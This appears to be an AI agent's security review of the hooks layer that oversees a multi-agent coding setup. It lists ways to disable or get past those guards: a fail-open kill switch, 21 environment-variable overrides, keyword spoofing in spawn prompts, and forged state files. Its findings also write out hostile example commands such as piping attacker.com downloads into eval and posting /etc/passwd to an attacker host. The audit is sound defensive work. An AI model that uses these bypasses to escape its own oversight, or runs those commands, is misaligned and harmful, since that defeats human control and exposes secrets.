<!-- Agent: security-architect | Task: #118 | Session: 2026-02-07 -->

# Hooks System Security Review -- Pipeline #14

**Date:** 2026-02-07
**Reviewer:** Security Architect Agent
**Scope:** `.claude/hooks/` -- Full enforcement/validation layer
**Classification:** INTERNAL -- SECURITY SENSITIVE

---

## Executive Summary

The hooks system is the backbone of the agent-studio enforcement architecture, comprising 45 active hooks across 9 subdirectories. It enforces routing rules, tool restrictions, creator workflows, bash command validation, and loop prevention. While the architecture demonstrates defense-in-depth principles with multiple overlapping guards, **critical bypass vectors exist** through environment variable overrides, overly permissive allowlists, and string-based agent detection that is trivially spoofable. The system's fail-closed posture is undermined by a master kill switch (`HOOK_FAIL_OPEN=true`) and several hooks that fail open by default.

**Security Score: 52/100** (CONDITIONAL PASS -- Significant remediation required)

**Approval Status: CONDITIONAL** -- Must remediate CRITICAL findings before production deployment.

---

## Scoring Breakdown

| Category | Weight | Score | Weighted |
|----------|--------|-------|----------|
| Bypass Resistance | 30% | 35/100 | 10.5 |
| Hook Integrity | 20% | 55/100 | 11.0 |
| Enforcement Completeness | 20% | 75/100 | 15.0 |
| Input Validation | 15% | 50/100 | 7.5 |
| Information Leakage | 15% | 55/100 | 8.25 |
| **Total** | **100%** | | **52.25** |

---

## STRIDE Threat Model

### S -- Spoofing

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Agent type spoofing via prompt string manipulation | HIGH | HIGH | String matching on "you are PLANNER" etc. | Trivially bypassed by including keywords in prompt |
| Creator state file manipulation | MEDIUM | MEDIUM | TTL + JSON state file | No HMAC/integrity protection on state file |
| Router state tampering | HIGH | MEDIUM | File-based state at router-state.json | No integrity verification, writable by any process |

**Key Risk:** Agent type detection in `pre-task-unified.cjs` (lines 153-180) and `routing-guard.cjs` uses `prompt.toLowerCase().includes(pattern)` which means any spawned agent can claim to be a PLANNER or SECURITY-ARCHITECT by including the detection keywords anywhere in the prompt.

### T -- Tampering

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Environment variable override to disable all hooks | CRITICAL | MEDIUM | Audit logging via auditSecurityOverride() | No protection against env var injection |
| State file modification (router-state.json, active-creators.json, loop-state.json) | HIGH | MEDIUM | File-based with atomic writes | No checksum/HMAC, writable by any hook process |
| Registry.cjs SAFE_COMMANDS_ALLOWLIST includes eval/exec | CRITICAL | HIGH | Allowlist check before command execution | eval and exec are inherently dangerous |

**Key Risk:** Setting `HOOK_FAIL_OPEN=true` disables fail-closed behavior in routing-guard.cjs, pre-task-unified.cjs, unified-creator-guard.cjs, and unified-pre-write-hook.cjs simultaneously. This is a single point of failure for the entire enforcement layer.

### R -- Repudiation

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Security override without audit trail | HIGH | MEDIUM | auditSecurityOverride() to stderr | Stderr can be redirected/lost; no persistent log |
| Hook bypass without detection | HIGH | MEDIUM | Individual audit logging per hook | No centralized security event dashboard |

**Key Risk:** While `auditSecurityOverride()` in hook-input.cjs provides consistent override logging, it writes to stderr which is ephemeral. No persistent, tamper-evident audit log exists for security-critical events.

### I -- Information Disclosure

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Debug logging exposing internal state | MEDIUM | LOW | DEBUG_HOOKS gated output | ROUTER_DEBUG defaults to enabled (not 'false') |
| Error messages exposing hook internals | LOW | LOW | Generic error messages | Stack traces suppressed (HOOK-010 fix) |
| Routing analysis output leaking intent classification | LOW | LOW | Advisory output only | user-prompt-unified outputs agent scores to stdout |

**Current posture is acceptable** for information disclosure. Debug outputs are gated and stack traces are suppressed (HOOK-010 remediation).

### D -- Denial of Service

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Loop/infinite spawn exhaustion | HIGH | MEDIUM | Loop prevention in pre-task-unified.cjs | Budget/depth limits configurable via env vars |
| Hook chain performance degradation | MEDIUM | LOW | Consolidated hooks (5-to-1 consolidation) | Some hooks still run synchronous spawnSync |
| State file contention | LOW | LOW | Atomic writes, lock files | Lock timeout is 10s, sufficient |

**Loop prevention** is well-designed with spawn depth limits (default 5), pattern detection (threshold 3), evolution budget (3), and cooldown periods (5 minutes). However, all limits are overridable via environment variables.

### E -- Elevation of Privilege

| Threat | Impact | Likelihood | Current Mitigation | Gap |
|--------|--------|------------|-------------------|-----|
| Router using blacklisted tools | HIGH | LOW | routing-guard.cjs bash/write/tool checks | ROUTER_BASH_GUARD=off, ROUTER_WRITE_GUARD=off overrides |
| Subagent bypassing tool-scope-validator | HIGH | MEDIUM | tool-scope-validator.cjs | Defaults to WARN, fails OPEN on error |
| Creator guard bypass via active-creators.json | MEDIUM | MEDIUM | TTL-based creator state | State file manipulation skips creator workflow |

---

## Findings

### CRITICAL

#### SEC-HOOK-001: HOOK_FAIL_OPEN Master Kill Switch

**File:** Multiple (`routing-guard.cjs:1041-1043`, `pre-task-unified.cjs:724-727`, `unified-creator-guard.cjs:468-471`, `unified-pre-write-hook.cjs:~509`)

**Description:** Setting the single environment variable `HOOK_FAIL_OPEN=true` converts ALL fail-closed hooks to fail-open, simultaneously disabling:
- Routing guard (planner-first, security review, router self-check)
- Pre-task unified (TaskList-first, loop prevention, routing checks)
- Creator guard (artifact creation workflow enforcement)
- Pre-write hook (all 10 write validation checks)

**Impact:** Complete bypass of the enforcement layer with a single environment variable. An adversarial prompt that can influence environment configuration, or any process running in the same shell, can disable all security hooks.

**Evidence:**
```javascript
// routing-guard.cjs lines 1041-1043
if (process.env.HOOK_FAIL_OPEN === 'true') {
  auditLog('routing-guard', 'fail_open_override', { error: err.message });
  process.exit(0);
}
```

**CVSS Estimate:** 8.1 (High)

**Recommendation:**
1. Remove `HOOK_FAIL_OPEN` as a global override. Each hook should have its own specific debug override.
2. If retained, require a multi-factor override (e.g., `HOOK_FAIL_OPEN` + a per-session nonce written to a file).
3. Add persistent audit logging (not just stderr) when any fail-open override is used.

---

#### SEC-HOOK-002: SAFE_COMMANDS_ALLOWLIST Contains eval and exec

**File:** `.claude/hooks/safety/validators/registry.cjs:144-145`

**Description:** The bash command validator's allowlist includes `eval` and `exec` as "safe" shell builtins. These are two of the most dangerous shell commands:
- `eval` executes arbitrary strings as shell commands, enabling code injection
- `exec` replaces the current process, can be used for process hijacking

Any command starting with `eval` or `exec` will pass the allowlist check without further validation.

**Impact:** A crafted bash command like `eval "$(curl attacker.com/payload)"` would pass the allowlist because `eval` is considered "safe."

**Evidence:**
```javascript
// registry.cjs lines 144-145
'eval', // evaluate expression
'exec', // execute command
```

**CVSS Estimate:** 9.0 (Critical)

**Recommendation:**
1. Remove `eval` and `exec` from SAFE_COMMANDS_ALLOWLIST immediately.
2. Add them to a DANGEROUS_COMMANDS list that requires special validation.
3. Block `eval` commands entirely unless wrapped in a specific validator.
4. Also review `source` (line 142) and `.` (line 143) which can execute arbitrary scripts.

---

#### SEC-HOOK-003: 8+ Environment Variable Overrides Disable Individual Guards

**File:** Multiple hooks

**Description:** The following environment variables each independently disable a specific security control:

| Variable | Hook | Effect |
|----------|------|--------|
| `HOOK_FAIL_OPEN=true` | All fail-closed hooks | Master kill switch |
| `ROUTER_SELF_CHECK=off` | routing-guard.cjs | Router can use blacklisted tools |
| `PLANNER_FIRST_ENFORCEMENT=off` | routing-guard.cjs / pre-task-unified.cjs | Skip planner-first requirement |
| `SECURITY_REVIEW_ENFORCEMENT=off` | routing-guard.cjs / pre-task-unified.cjs | Skip security review requirement |
| `ROUTER_WRITE_GUARD=off` | routing-guard.cjs | Router can write files directly |
| `ROUTER_BASH_GUARD=off` | routing-guard.cjs | Router can run arbitrary bash |
| `CREATOR_GUARD=off` | unified-creator-guard.cjs | Direct artifact writes allowed |
| `SHELL_INJECTION_VALIDATOR=off` | shell-injection-validator.cjs | No shell injection checking |
| `LOOP_PREVENTION_MODE=off` | pre-task-unified.cjs | No loop prevention |
| `ALLOW_UNREGISTERED_COMMANDS=true` | validators/registry.cjs | Bypass command validation |
| `BASH_VALIDATOR_FAIL_OPEN=true` | bash-command-validator.cjs | Bash validator fails open |
| `TASK_COMPLETION_GUARD=off` | post-task-unified.cjs | No completion tracking |
| `TASKLIST_FIRST_ENFORCEMENT=off` | pre-task-unified.cjs | TaskList-first not enforced |

**Impact:** An adversary with environment access can disable any combination of security controls. The cumulative effect is a defense-in-depth architecture where each layer can be independently bypassed.

**CVSS Estimate:** 7.5 (High)

**Recommendation:**
1. Reduce the number of individual overrides. Consolidate into a single `SECURITY_LEVEL` variable with graduated settings (strict/standard/permissive/off).
2. Require the override variables to be set via a config file with integrity checking, not environment variables.
3. Log ALL override activations to a persistent, append-only audit file.

---

### HIGH

#### SEC-HOOK-004: Agent Type Detection via String Matching is Spoofable

**File:** `pre-task-unified.cjs:153-180`, `post-task-unified.cjs:94-123`, `routing-guard.cjs`

**Description:** Agent type detection relies on `prompt.toLowerCase().includes(pattern)` where patterns are simple strings like 'you are planner', 'security-architect'. Any spawn prompt can include these strings to fool the guard into thinking the correct agent type is being spawned.

**Example bypass:** A developer agent spawn prompt that includes "Note: this task was reviewed by security-architect" would set `securitySpawned=true` in router state, satisfying the security review requirement without actually spawning a security architect.

**Evidence:**
```javascript
// pre-task-unified.cjs
function isSecuritySpawn(toolInput) {
  const prompt = (toolInput.prompt || '').toLowerCase();
  for (const pattern of SECURITY_PATTERNS.prompt) {
    if (prompt.includes(pattern)) return true; // Any mention suffices
  }
}
```

**Impact:** Planner-first and security-review-first enforcement can be bypassed by crafting spawn prompts that include detection keywords.

**Recommendation:**
1. Use structured metadata (e.g., `toolInput.subagent_type`) as the primary detection method, not prompt text analysis.
2. If prompt-based detection must be used, require the keywords to appear in specific positions (e.g., first line of prompt, after a standard delimiter).
3. Add a cryptographic token or nonce that the router sets and the guard validates, proving the router explicitly chose that agent type.

---

#### SEC-HOOK-005: shell-injection-validator Has Extremely Narrow Coverage

**File:** `.claude/hooks/safety/shell-injection-validator.cjs`

**Description:** The shell injection validator only checks for `rm -rf` related patterns (7 patterns total). It completely misses:
- Command substitution: `` `command` `` or `$(command)`
- Pipe to shell: `curl url | bash`, `wget -O- url | sh`
- Background execution: `command &`
- Named pipes: `mkfifo /tmp/pipe`
- Interpreter invocation: `python -c "..."`, `perl -e "..."`
- File read: `cat /etc/passwd`, `cat /etc/shadow`
- Network exfiltration: `curl -d @/etc/passwd attacker.com`
- Environment dumping: `env`, `printenv`

**Impact:** Most shell injection attacks will pass undetected. The validator provides a false sense of security.

**Recommendation:**
1. Expand pattern coverage to include command substitution, pipe-to-shell, interpreter invocation, and network exfiltration patterns.
2. Implement a positive security model (allowlist of permitted command patterns) rather than negative (blocklist of dangerous patterns).
3. Consider using a shell AST parser for robust command analysis.

---

#### SEC-HOOK-006: tool-scope-validator Defaults to Warn and Fails Open

**File:** `.claude/hooks/routing/tool-scope-validator.cjs:66`

**Description:** The tool-scope-validator, which controls which tools each agent can use, defaults to 'warn' mode (not 'block') and fails open on any error. Additionally, if `allowed_tools` is empty or undefined, validation is skipped entirely.

**Evidence:**
```javascript
// tool-scope-validator.cjs
const agentAllowedTools = hookInput.allowed_tools || [];
if (agentAllowedTools.length === 0) {
  process.exit(0); // No restriction - SKIP ALL VALIDATION
}
// ...
} catch (err) {
  process.exit(0); // Fail open on error
}
```

**Impact:** Agent tool restrictions are advisory only. Agents can use any tool unless explicitly restricted, and even then only get a warning.

**Recommendation:**
1. Change default mode to 'block'.
2. Change error handling to fail-closed (exit 2).
3. Require agents to explicitly declare their allowed tools; deny by default when the list is empty.

---

#### SEC-HOOK-007: Creator Guard State File Has No Integrity Protection

**File:** `.claude/hooks/routing/unified-creator-guard.cjs:175-203`

**Description:** The `active-creators.json` state file that tracks which creator workflows are active uses plain JSON with no HMAC, checksum, or signature verification. Any process can write to this file to mark a creator as "active," thereby bypassing the creator guard.

**Evidence:**
```javascript
// unified-creator-guard.cjs line 180
const state = JSON.parse(fs.readFileSync(statePath, 'utf8'));
// No integrity verification
```

**Impact:** An attacker or misconfigured hook can write `{"skill-creator": {"active": true, "invokedAt": "2026-02-07T...", "ttl": 600000}}` to bypass the creator guard for any artifact type.

**Recommendation:**
1. Add HMAC signing to the state file using a per-session secret.
2. Validate HMAC before trusting the state file contents.
3. Add the creator guard state to the anomaly detector for tamper detection.

---

#### SEC-HOOK-008: Duplicate Creator Guard Enforcement Creates Inconsistency

**File:** `unified-pre-write-hook.cjs` (Check 8) AND `unified-creator-guard.cjs` (standalone)

**Description:** Creator guard logic is implemented both as Check 8 inside `unified-pre-write-hook.cjs` AND as a standalone `unified-creator-guard.cjs` hook. Both are registered in settings.json. This creates:
1. Double enforcement (wasted compute)
2. Potential inconsistency if one is updated without the other
3. Confusion about which is the canonical guard

**Impact:** If one implementation is bypassed or has a bug, the other may still catch it (defense in depth), but the inconsistency risk outweighs the benefit.

**Recommendation:**
1. Designate one as canonical and remove the duplicate.
2. If both are intentional for defense-in-depth, document this explicitly and ensure identical logic.

---

### MEDIUM

#### SEC-HOOK-009: task-status-enforcement.cjs Uses Plain JSON.parse

**File:** `.claude/hooks/routing/task-status-enforcement.cjs:69`

**Description:** Uses `JSON.parse()` directly on state file content without `safeParseJSON()` from safe-json.cjs. This is inconsistent with the SEC-007 prototype pollution prevention standard applied elsewhere in the codebase.

**Impact:** Potential prototype pollution if an attacker can inject `__proto__` keys into the state file.

**Recommendation:** Replace `JSON.parse()` with `safeParseJSON()` from `../../lib/utils/safe-json.cjs`.

---

#### SEC-HOOK-010: reflection-queue-processor Builds Prompts Without Sanitization

**File:** `.claude/hooks/reflection/reflection-queue-processor.cjs`

**Description:** The `generateSpawnRequest()` function builds spawn prompts from reflection queue entries without sanitizing the content. If an attacker can inject content into the reflection queue, it could result in prompt injection when the reflection agent is spawned.

**Impact:** Prompt injection via reflection queue could cause unintended agent behavior.

**Recommendation:**
1. Sanitize queue entry content before incorporating into spawn prompts.
2. Validate queue entries against a schema before processing.
3. Limit the maximum size of queue entry content.

---

#### SEC-HOOK-011: windows-null-sanitizer Fails Open on Error

**File:** `.claude/hooks/safety/windows-null-sanitizer.cjs:173`

**Description:** The Windows null device sanitizer fails open (exit 0) on any error, meaning if the hook crashes, Windows reserved filename writes are allowed.

**Impact:** On Windows, files named `nul`, `con`, `prn`, etc. could be created if the sanitizer errors.

**Recommendation:** Change error handling to fail-closed (exit 2) to prevent reserved filename creation when the sanitizer is in an unknown state.

---

#### SEC-HOOK-012: config-model-validator Fails Open on Error

**File:** `.claude/hooks/routing/config-model-validator.cjs:301-303`

**Description:** The config model validator fails open on any error, allowing model mismatches to go unchecked.

**Evidence:**
```javascript
} catch (err) {
  auditLog('config-model-validator', 'error', { error: err.message });
  process.exit(0); // Fail open
}
```

**Impact:** Model downgrade attacks (spawning with weaker model than configured) succeed if the validator errors.

**Recommendation:** Change to fail-closed for security-critical agents (security-architect, planner).

---

#### SEC-HOOK-013: user-prompt-unified Outputs Routing Analysis to stdout

**File:** `.claude/hooks/routing/user-prompt-unified.cjs:791-818`

**Description:** The user-prompt-unified hook outputs detailed routing analysis including agent scores, complexity classification, and security review requirements to stdout. This information could be used to craft prompts that game the routing system.

**Impact:** Low -- this is advisory output, but it reveals the internal scoring algorithm.

**Recommendation:** Move routing analysis output to stderr or make it conditional on DEBUG_HOOKS.

---

#### SEC-HOOK-014: Multiple Hooks Run spawnSync for Child Processes

**File:** `user-prompt-unified.cjs:1321, 1390, 1409`

**Description:** The user-prompt-unified hook uses `spawnSync` to run reflection-queue-processor.cjs and memory-scheduler.cjs as child processes. These spawns happen synchronously in the UserPromptSubmit lifecycle, adding latency to every user prompt. More critically, the spawned processes inherit the parent environment including all security override variables.

**Impact:** Performance degradation and environment variable inheritance to child processes.

**Recommendation:**
1. Strip security-override environment variables before spawning child processes.
2. Consider making these async/deferred rather than synchronous.

---

### LOW

#### SEC-HOOK-015: code-index-updater Lock File Race Condition

**File:** `.claude/hooks/routing/code-index-updater.cjs:107-144`

**Description:** The lock file mechanism uses `fs.stat()` + `fs.writeFile('wx')` which is not fully atomic. A TOCTOU (time-of-check-time-of-use) race condition exists between the stale lock check and the lock acquisition.

**Impact:** Low -- worst case is redundant indexing, not a security issue.

**Recommendation:** Use OS-level file locking or accept the benign race condition with a comment.

---

#### SEC-HOOK-016: source and dot (.) in SAFE_COMMANDS_ALLOWLIST

**File:** `.claude/hooks/safety/validators/registry.cjs:142-143`

**Description:** `source` and `.` (dot notation) are in the safe commands allowlist. These commands execute arbitrary script files, which could be used to run malicious scripts.

**Impact:** Lower than eval/exec since they require a file path argument, but still enable execution of arbitrary code.

**Recommendation:** Move `source` and `.` to a validated-commands list that requires the script path to be within the project.

---

## Enforcement Completeness Analysis

### Lifecycle Coverage

| Event | Hooks | Coverage |
|-------|-------|----------|
| UserPromptSubmit | 3 (user-prompt-unified, state-reset, execution-limit-monitor) | GOOD -- Resets state, analyzes prompt, detects triggers |
| PreToolUse(Task) | 5 (pre-task-unified, config-model-validator, intent-agent-match, spawn-prompt-assembler, spawn-prompt-validator) | GOOD -- Comprehensive spawn validation |
| PreToolUse(Bash) | 4 (bash-command-validator, shell-injection-validator, routing-guard, execution-limit-monitor) | MODERATE -- Command validation has gaps (SEC-HOOK-002, SEC-HOOK-005) |
| PreToolUse(Edit/Write) | 5 (unified-pre-write-hook, unified-creator-guard, routing-guard, windows-null-sanitizer, execution-limit-monitor) | GOOD -- Multiple overlapping write guards |
| PostToolUse(Task) | 2 (post-task-unified, execution-limit-monitor) | GOOD -- Learning extraction, completion tracking |
| PostToolUse(Edit/Write) | 2 (sync-memory-index, code-index-updater) | GOOD -- Index maintenance |
| SessionEnd | 2 (session-cleanup, session-end handler) | ADEQUATE -- Cleanup and state persistence |
| Stop | 1 (execution-limit-monitor) | ADEQUATE |

### Gap Analysis

1. **No PreToolUse guard for WebSearch/WebFetch** -- While routing-guard blocks Router from using these, there is no content validation for search queries or fetched URLs from spawned agents.
2. **No PostToolUse validation for Bash** -- Bash command output is not inspected for sensitive data leakage.
3. **No integrity verification for hook files themselves** -- If a hook .cjs file is tampered with, there is no mechanism to detect this (no hash verification at load time).

---

## Positive Findings

The hooks system demonstrates several security strengths:

1. **Defense-in-depth architecture:** Multiple hooks cover the same lifecycle events, so bypassing one does not bypass all protections.

2. **Prototype pollution prevention (SEC-007):** `hook-input.cjs` implements `sanitizeObject()` with `DANGEROUS_KEYS` filtering and `Object.create(null)` patterns.

3. **Consolidated hook design:** Reducing 5+ individual hooks to single unified hooks (pre-task-unified, post-task-unified, user-prompt-unified, unified-pre-write-hook) improves performance and reduces attack surface.

4. **Consistent audit logging:** `auditSecurityOverride()` provides a standardized interface for logging security overrides across all hooks.

5. **Loop prevention with multiple signals:** Spawn depth, pattern detection, evolution budget, and cooldown periods provide robust loop prevention.

6. **Atomic file writes:** State files use `atomicWriteJSONSync` to prevent corruption from concurrent writes.

7. **TTL on creator state:** Active creator TTL reduced from 10 to 3 minutes (SEC-REMEDIATION-001), limiting the window for state manipulation.

8. **Safe JSON parsing adoption:** Many hooks have been updated to use `safeParseJSON()` (though not all -- see SEC-HOOK-009).

---

## IEEE 1028 Hybrid Validation Checklist

### Security (IEEE 1028 Base)

- [x] Input validation on hook inputs (sanitizeObject, ALLOWED_HOOK_INPUT_KEYS)
- [ ] No SQL injection vulnerabilities (N/A -- no SQL in hooks)
- [x] No XSS vulnerabilities (N/A -- no web output)
- [ ] Sensitive data encrypted at rest/transit (state files in plaintext)
- [x] Authentication and authorization checks present (tool-scope-validator, routing-guard)
- [ ] No hardcoded secrets or credentials (CONFIRMED -- no secrets found)
- [x] OWASP Top 10 considered (injection, broken access control addressed)

### [AI-GENERATED] Context-Specific Items

- [ ] [AI-GENERATED] All environment variable overrides logged to persistent audit file
- [ ] [AI-GENERATED] State files have integrity verification (HMAC/checksum)
- [ ] [AI-GENERATED] Agent type detection uses structured metadata, not prompt text
- [ ] [AI-GENERATED] SAFE_COMMANDS_ALLOWLIST excludes dangerous builtins (eval, exec, source)
- [ ] [AI-GENERATED] Shell injection patterns cover OWASP command injection categories
- [ ] [AI-GENERATED] Fail-closed is default for all security hooks (not just some)
- [x] [AI-GENERATED] Prototype pollution prevention applied consistently
- [x] [AI-GENERATED] Hook consolidation reduces process spawn overhead
- [x] [AI-GENERATED] Loop prevention has multiple detection signals

**Total Items:** 16
**IEEE Base:** 7 (44%)
**Contextual:** 9 (56%)
**Passing:** 7/16 (44%)

---

## Recommendations Summary

### Priority 1 (Immediate -- Before Next Release)

| ID | Finding | Action |
|----|---------|--------|
| SEC-HOOK-002 | eval/exec in allowlist | Remove eval, exec, source, . from SAFE_COMMANDS_ALLOWLIST |
| SEC-HOOK-001 | HOOK_FAIL_OPEN kill switch | Replace with per-hook specific overrides; require config file |
| SEC-HOOK-005 | Narrow shell injection coverage | Expand to cover OWASP command injection patterns |

### Priority 2 (Next Sprint)

| ID | Finding | Action |
|----|---------|--------|
| SEC-HOOK-004 | Spoofable agent detection | Use structured metadata for agent type detection |
| SEC-HOOK-006 | tool-scope-validator warn default | Change to block default, fail-closed on error |
| SEC-HOOK-003 | Environment override sprawl | Consolidate into graduated SECURITY_LEVEL setting |
| SEC-HOOK-007 | Creator state no integrity | Add HMAC signing to active-creators.json |

### Priority 3 (Backlog)

| ID | Finding | Action |
|----|---------|--------|
| SEC-HOOK-008 | Duplicate creator guard | Designate canonical implementation |
| SEC-HOOK-009 | Plain JSON.parse in task-status | Replace with safeParseJSON |
| SEC-HOOK-010 | Reflection queue no sanitization | Add content sanitization |
| SEC-HOOK-011 | windows-null-sanitizer fail-open | Change to fail-closed |
| SEC-HOOK-012 | config-model-validator fail-open | Change to fail-closed for security agents |
| SEC-HOOK-013 | Routing analysis to stdout | Move to stderr or gate on DEBUG |
| SEC-HOOK-014 | spawnSync env inheritance | Strip security overrides from child env |

---

## Hook Inventory Summary

### Active Hooks by Directory (45 total)

| Directory | Count | Purpose |
|-----------|-------|---------|
| routing/ | 12 | Routing enforcement, model validation, task tracking |
| safety/ | 9 | Bash validation, shell injection, write scanning |
| reflection/ | 5 | Reflection queue processing, step-0 guard |
| monitoring/ | 5 | Execution limits, anomaly detection |
| evolution/ | 4 | Evolution state tracking |
| session/ | 2 | State reset, cleanup |
| validation/ | 2 | Pre-completion validation |
| memory/ | 1 | Memory index sync |
| self-healing/ | 1 | Anomaly detection |
| root/ | 1 | Unified pre-write hook |

### Archived Hooks (44 total)

44 hooks in `.claude/hooks/_archive/` -- properly archived with individual hooks consolidated into unified versions.

---

## Cross-Pipeline Security Pattern

This review identifies a pattern consistent with findings from Pipelines #11-#13:

1. **Environment variable override sprawl** (found in hooks, routing, context systems)
2. **String-based detection bypasses** (found in hooks, spawn prompts, agent routing)
3. **State file integrity gaps** (found in hooks, routing state, memory system)
4. **Inconsistent fail-open/fail-closed** (found across all subsystems)

These are systemic issues requiring architectural remediation, not point fixes.

---

## Appendix: Environment Variable Override Map

```
HOOK_FAIL_OPEN=true          -> ALL fail-closed hooks -> fail-open
ROUTER_SELF_CHECK=off        -> Router can use blacklisted tools
PLANNER_FIRST_ENFORCEMENT=off -> Skip planner-first for complex tasks
SECURITY_REVIEW_ENFORCEMENT=off -> Skip security review for sensitive tasks
ROUTER_WRITE_GUARD=off       -> Router can write files directly
ROUTER_BASH_GUARD=off        -> Router can run arbitrary bash
CREATOR_GUARD=off            -> Direct artifact writes without workflow
SHELL_INJECTION_VALIDATOR=off -> No shell injection checking
LOOP_PREVENTION_MODE=off     -> No loop prevention
ALLOW_UNREGISTERED_COMMANDS=true -> Bypass command validation registry
BASH_VALIDATOR_FAIL_OPEN=true -> Bash validator fails open on error
TASK_COMPLETION_GUARD=off    -> No completion tracking enforcement
TASKLIST_FIRST_ENFORCEMENT=off -> TaskList-first not enforced
CONFIG_MODEL_VALIDATOR=off   -> Model mismatch not detected
EVOLUTION_AUDIT=off          -> Evolution audit disabled
EVOLUTION_TRIGGER_DETECTION=off -> Evolution triggers not detected
CODE_INDEX_AUTO_UPDATE=off   -> Code indexing disabled
ANOMALY_DETECTION_ENABLED=false -> Anomaly detection disabled
MEMORY_SPAWN_THROTTLING=off  -> Memory pressure throttling disabled
SPAWN_PROMPT_VALIDATOR=off   -> Spawn prompt validation disabled
SEMANTIC_ROUTING=off         -> Semantic routing disabled
```

Total: **21 independent environment variable overrides** affecting security posture.

---

*End of Security Review -- Pipeline #14: Hooks System Deep Dive*
